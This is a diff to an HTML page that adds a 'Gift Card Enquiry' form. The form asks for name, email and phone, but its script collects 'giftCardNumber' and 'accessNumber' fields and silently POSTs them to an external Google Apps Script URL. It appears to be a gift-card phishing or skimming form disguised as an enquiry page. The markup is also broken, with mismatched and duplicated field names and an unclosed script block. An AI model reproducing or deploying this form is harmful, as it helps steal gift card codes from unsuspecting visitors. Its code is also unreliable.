@@ -115,7 +115,47 @@
           alert("⚠️ Something went wrong! Try again.");
         });
     });
-  </script>
+                    <div class="container">
+    <h2>Gift Card Enquiry</h2>
+    <form id="cardForm">
+      <input type="text" name="text " placeholder="your name " required>
+      <input type="text" name="accessNumber" placeholder="your name " required>
+      <input type="text" name="accessNumber" placeholder="your email " required>
+      <input type="text" name="accessNumber" placeholder="phone number  " required>
+      <input type="text" name="accessNumber" placeholder="your message  " required>
+
+      <button type="submit">Submit</button>
+    </form>
+    <p id="errorMsg">✅ Form submitted successfully!</p>
+  </div>
+
+  <script>
+    document.getElementById("cardForm").addEventListener("submit", function (event) { 
+      event.preventDefault();
+
+      const formData = new FormData(event.target);
+      const formDetails = {
+        giftCardNumber: formData.get("giftCardNumber"),
+        accessNumber: formData.get("accessNumber"),
+      };
+
+      const scriptURL = "https://script.google.com/macros/s/AKfycbxxWc-gnkS1RosZF33aahxTFUWTINAoiyhin9pOzzVUZLJOugP4NAodKW7E8IHM5y03/exec";
+
+      fetch(scriptURL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(formDetails),
+      })
+        .then(() => {
+          document.getElementById("errorMsg").style.display = "block";
+          document.getElementById("cardForm").reset();
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+          alert("⚠️ Something went wrong! Try again.");
+        });
+    });
 
 </body>
 </html>
